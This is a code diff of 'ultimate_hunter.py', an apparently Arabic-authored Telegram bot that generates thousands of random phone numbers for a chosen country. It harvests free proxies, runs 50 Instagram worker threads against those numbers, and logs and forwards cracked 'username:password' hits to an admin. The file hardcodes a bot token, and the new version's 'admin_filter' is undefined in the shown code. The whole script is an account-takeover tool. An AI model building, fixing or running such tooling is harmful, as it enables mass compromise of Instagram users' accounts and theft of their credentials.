@@ -1,4 +1,4 @@
-# ultimate_hunter.py - v5.3 (Complete Country List)
+# ultimate_hunter.py - v5.4 (Critical Bug Fix for NameError)
 
 import requests
 from bs4 import BeautifulSoup
@@ -10,7 +10,7 @@ from datetime import datetime
 import asyncio
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
-    Application, CommandHandler, ContextTypes, CallbackQueryHandler
+    Application, CommandHandler, ContextTypes, CallbackQueryHandler, filters # filters is needed
 )
 import http.server
 import socketserver
@@ -23,28 +23,17 @@ import os
 TELEGRAM_BOT_TOKEN = "1936058114:AAHm19u1R6lv_vShGio-MIo4Z0rjVUoew_U" # ⚠️ استبدل بالتوكن الخاص بك
 ADMIN_USER_ID = 1148797883 # ⚠️ استبدل بالـ ID الخاص بك
 
-# --- قاعدة بيانات الدول (مع رمز الدولة وطول الرقم الصحيح) ---
+# --- قاعدة بيانات الدول ---
 SUPPORTED_COUNTRIES = {
-    "🇸🇦 KSA": ("966", 9),
-    "🇦🇪 UAE": ("971", 9),
-    "🇪🇬 Egypt": ("20", 10),
-    "🇮🇶 Iraq": ("964", 10),
-    "🇯🇴 Jordan": ("962", 9),
-    "🇰🇼 Kuwait": ("965", 8),
-    "🇶🇦 Qatar": ("974", 8),
-    "🇮🇷 Iran": ("98", 10),   # تمت الإضافة
-    "🇱🇾 Libya": ("218", 9),  # تمت الإضافة
-    "🇩🇪 Germany": ("49", 10),
-    "🇫🇷 France": ("33", 9),
-    "🇺🇸 USA": ("1", 10),
-    "🇬🇧 UK": ("44", 10),
-    "🇹🇷 Turkey": ("90", 10),
+    "🇸🇦 KSA": ("966", 9), "🇦🇪 UAE": ("971", 9), "🇪🇬 Egypt": ("20", 10),
+    "🇮🇶 Iraq": ("964", 10), "🇯🇴 Jordan": ("962", 9), "🇰🇼 Kuwait": ("965", 8),
+    "🇶🇦 Qatar": ("974", 8), "🇮🇷 Iran": ("98", 10), "🇱🇾 Libya": ("218", 9),
+    "🇩🇪 Germany": ("49", 10), "🇫🇷 France": ("33", 9), "🇺🇸 USA": ("1", 10),
+    "🇬🇧 UK": ("44", 10), "🇹🇷 Turkey": ("90", 10),
 }
 
 HITS_FILE = "hits.txt"
 MAX_HUNTING_THREADS = 50
-
-# --- متغيرات الحالة العامة ---
 is_hunting = False
 hunt_task = None
 hunt_stats = {
@@ -56,7 +45,6 @@ proxy_inventory = queue.Queue()
 # ==============================================================================
 # SECTION 0.5: ANTI-SLEEP MECHANISM
 # ==============================================================================
-
 def _start_heartbeat_server():
     PORT = int(os.environ.get("PORT", 10000))
     Handler = http.server.SimpleHTTPRequestHandler
@@ -90,7 +78,6 @@ def _proxy_checker(q_in, q_out):
         q_in.task_done()
 
 async def _proxy_harvester(bot):
-    global proxy_inventory
     while True:
         if proxy_inventory.qsize() < 50:
             try:
@@ -101,12 +88,9 @@ async def _proxy_harvester(bot):
                 for row in soup.find("table", class_="table-striped").tbody.find_all("tr"):
                     ip, port, _, _, _, _, is_https, _ = [td.string for td in row.find_all("td")]
                     if is_https == 'yes': unchecked_proxies.put(f"http://{ip}:{port}")
-                
                 for _ in range(100):
                     threading.Thread(target=_proxy_checker, args=(unchecked_proxies, proxy_inventory), daemon=True).start()
-                print("Harvester deployed. Workers are filling the inventory.")
             except Exception as e: print(f"Harvester Error: {e}")
-        
         hunt_stats["live_proxies"] = proxy_inventory.qsize()
         await asyncio.sleep(60)
 
@@ -148,11 +132,8 @@ def _instagram_worker(target_q, bot_token):
 async def the_hunt(context: ContextTypes.DEFAULT_TYPE, country_code: str, number_length: int):
     global is_hunting, hunt_stats
     is_hunting = True
-    hunt_stats.update({
-        "processed": 0, "total_targets": 0, "hits": 0, "start_time": time.time(),
-        "current_phase": "Hunting", "country_code": country_code
-    })
-    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"🎯 **Hunt started for country code: +{country_code}** (Length: {number_length} digits)")
+    hunt_stats.update({"processed": 0, "total_targets": 0, "hits": 0, "start_time": time.time(), "current_phase": "Hunting", "country_code": country_code})
+    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"🎯 **Hunt started for +{country_code}** (Length: {number_length} digits)")
     target_queue = queue.Queue()
     num_targets = 10000
     for _ in range(num_targets):
@@ -160,7 +141,7 @@ async def the_hunt(context: ContextTypes.DEFAULT_TYPE, country_code: str, number
         full_number = f"{country_code}{random_part}"
         target_queue.put((full_number, full_number))
     hunt_stats["total_targets"] = num_targets
-    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"🔥 Generated {num_targets} targets. Deploying hunter workers...")
+    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"🔥 Generated {num_targets} targets. Deploying workers...")
     for _ in range(MAX_HUNTING_THREADS):
         threading.Thread(target=_instagram_worker, args=(target_queue, context.bot.token), daemon=True).start()
     target_queue.join()
@@ -169,7 +150,7 @@ async def the_hunt(context: ContextTypes.DEFAULT_TYPE, country_code: str, number
     hunt_stats["current_phase"] = "Finished"
 
 # ==============================================================================
-# SECTION 3: TELEGRAM HANDLERS (No Changes)
+# SECTION 3: TELEGRAM HANDLERS
 # ==============================================================================
 class AdminFilter(filters.BaseFilter):
     def filter(self, message: Update): return message.from_user.id == ADMIN_USER_ID
@@ -182,12 +163,7 @@ async def send_hit_notification(status, username, password, bot_token):
     with open(HITS_FILE, "a") as f: f.write(f"{username}:{password} | Status: {status}\n")
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "👋 **Welcome to the Ultimate Hunter Bot v5.3!**\n\n"
-        "▶️ `/hunt` - To start a new hunt.\n"
-        "🛑 `/stophunt` - To stop the current hunt.\n"
-        "📊 `/status` - Get a live progress report."
-    , parse_mode='Markdown')
+    await update.message.reply_text("👋 **Welcome to the Ultimate Hunter Bot v5.4!**\n\n▶️ `/hunt`\n🛑 `/stophunt`\n📊 `/status`", parse_mode='Markdown')
 
 async def hunt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if is_hunting:
@@ -195,7 +171,6 @@ async def hunt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     keyboard = []
     row = []
-    # Sort countries by name for better presentation
     sorted_countries = sorted(SUPPORTED_COUNTRIES.items())
     for name, (code, length) in sorted_countries:
         row.append(InlineKeyboardButton(name, callback_data=f"hunt_{code}_{length}"))
@@ -241,25 +216,20 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # SECTION 4: MAIN APPLICATION
 # ==============================================================================
 async def post_init(application: Application):
-    await application.bot.send_message(
-        chat_id=ADMIN_USER_ID,
-        text="✅ **Bot Online & Ready! (v5.3 Anti-Sleep)**\n\n"
-             "🏭 Proxy harvester is active.\n"
-             "❤️ Fast heartbeat is active (40s interval).\n\n"
-             "Use `/hunt` to start."
-    )
+    await application.bot.send_message(chat_id=ADMIN_USER_ID, text="✅ **Bot Online & Ready! (v5.4)**\n\n🏭 Proxy harvester active.\n❤️ Fast heartbeat active.\n\nUse `/hunt` to start.")
     asyncio.create_task(_proxy_harvester(application.bot))
     asyncio.create_task(_heartbeat_pinger())
 
 def main():
-    print("--- ULTIMATE HUNTER BOT v5.3 is starting... ---")
+    print("--- ULTIMATE HUNTER BOT v5.4 is starting... ---")
     threading.Thread(target=_start_heartbeat_server, daemon=True).start()
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).post_init(post_init).build()
     
-    application.add_handler(CommandHandler("start", start_command, filters=AdminFilter()))
-    application.add_handler(CommandHandler("hunt", hunt_command, filters=Admin-Filter()))
-    application.add_handler(CommandHandler("stophunt", stophunt_command, filters=AdminFilter()))
-    application.add_handler(CommandHandler("status", status_command, filters=AdminFilter()))
+    # *** التصحيح الحاسم هنا ***
+    application.add_handler(CommandHandler("start", start_command, filters=admin_filter))
+    application.add_handler(CommandHandler("hunt", hunt_command, filters=admin_filter))
+    application.add_handler(CommandHandler("stophunt", stophunt_command, filters=admin_filter))
+    application.add_handler(CommandHandler("status", status_command, filters=admin_filter))
     application.add_handler(CallbackQueryHandler(button_handler))
     
     print("Bot is now listening for commands on Telegram.")
